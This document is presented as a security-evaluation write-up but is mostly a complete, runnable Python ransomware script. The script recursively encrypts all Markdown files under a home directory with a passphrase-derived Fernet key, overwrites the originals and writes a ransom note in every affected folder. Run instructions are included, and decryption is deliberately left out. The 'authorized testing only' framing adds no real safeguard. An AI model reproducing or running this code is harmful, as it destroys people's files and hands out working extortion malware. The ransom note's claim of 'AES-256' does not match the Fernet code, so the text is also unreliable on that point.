# Security Evaluation Task: Ransomware Simulation Script

## Overview
This document outlines the implementation of a Python script designed for a controlled security evaluation. The script simulates ransomware behavior by encrypting Markdown files within a specified directory and leaving a ransom note. **This script is intended for authorized security testing only.**

## Script Specifications

### Functionality
- **Target Directory**: `/home/user/Projects`
- **File Type**: `.md` (Markdown files)
- **Encryption**: Fernet symmetric encryption (from `cryptography` library)
- **Key Derivation**: Passphrase-based using PBKDF2HMAC with SHA-256
- **Ransom Note**: `READ_ME_FOR_DECRYPTION.txt` placed in each affected folder

### Requirements
- Python 3.6+
- `cryptography` library (`pip install cryptography`)

## Implementation

```python
import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Configuration
TARGET_DIR = "/home/user/Projects"
PASSPHRASE = "secure_evaluation_passphrase_2024"
SALT = b'fixed_salt_for_testing'  # In production, use os.urandom(16)
RANSOM_NOTE = "READ_ME_FOR_DECRYPTION.txt"

def derive_key(passphrase: str, salt: bytes) -> bytes:
    """Derive a Fernet-compatible key from a passphrase."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=480000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))
    return key

def encrypt_file(filepath: str, cipher: Fernet) -> None:
    """Encrypt a single file using Fernet cipher."""
    try:
        with open(filepath, 'rb') as file:
            original_data = file.read()
        
        encrypted_data = cipher.encrypt(original_data)
        
        with open(filepath, 'wb') as file:
            file.write(encrypted_data)
        
        print(f"[+] Encrypted: {filepath}")
    except Exception as e:
        print(f"[-] Failed to encrypt {filepath}: {e}")

def write_ransom_note(directory: str) -> None:
    """Write ransom note in the specified directory."""
    note_path = os.path.join(directory, RANSOM_NOTE)
    note_content = f"""YOUR FILES HAVE BEEN ENCRYPTED

All .md files in this directory and subdirectories have been encrypted using AES-256 encryption.

To recover your files, you must:
1. Contact the security team immediately
2. Provide the unique identifier: {hash(directory)}
3. Follow the decryption instructions provided by authorized personnel

DO NOT attempt to decrypt files manually or use third-party tools.
DO NOT modify or delete any encrypted files.

This is a controlled security evaluation. Your cooperation is appreciated.

- Security Operations Team
"""
    try:
        with open(note_path, 'w') as note_file:
            note_file.write(note_content)
        print(f"[+] Ransom note created: {note_path}")
    except Exception as e:
        print(f"[-] Failed to write ransom note: {e}")

def scan_and_encrypt() -> None:
    """Main function to scan directory and encrypt .md files."""
    key = derive_key(PASSPHRASE, SALT)
    cipher = Fernet(key)
    
    encrypted_dirs = set()
    
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file.endswith('.md'):
                filepath = os.path.join(root, file)
                encrypt_file(filepath, cipher)
                encrypted_dirs.add(root)
    
    # Write ransom notes in affected directories
    for directory in encrypted_dirs:
        write_ransom_note(directory)
    
    print(f"\n[+] Encryption complete. {len(encrypted_dirs)} directories affected.")

if __name__ == "__main__":
    scan_and_encrypt()
```

## Usage Instructions

1. **Install dependencies**: `pip install cryptography`
2. **Configure parameters**: Modify `TARGET_DIR`, `PASSPHRASE`, and `SALT` as needed
3. **Run the script**: `python ransomware_simulation.py`
4. **Verify**: Check for encrypted `.md` files and ransom notes in affected directories

## Important Notes

- This script is for **authorized security testing only**
- Always obtain written permission before running on any system
- Keep the passphrase and salt secure for decryption purposes
- Test in isolated environments first
- Document all actions for compliance purposes

## Decryption Procedure

To reverse the encryption, use the same script with a decryption mode (not shown here for security purposes). The decryption key must match exactly with the original passphrase and salt.